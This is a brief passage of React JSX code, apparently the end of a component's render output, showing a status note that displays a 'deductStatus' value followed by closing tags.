                <div className="nx-status-note" style={{ marginTop: "12px" }}>{deductStatus}</div>
              )}
            </div>
          </div>
        </div>
      </>
      )}
    </div>
  );
}
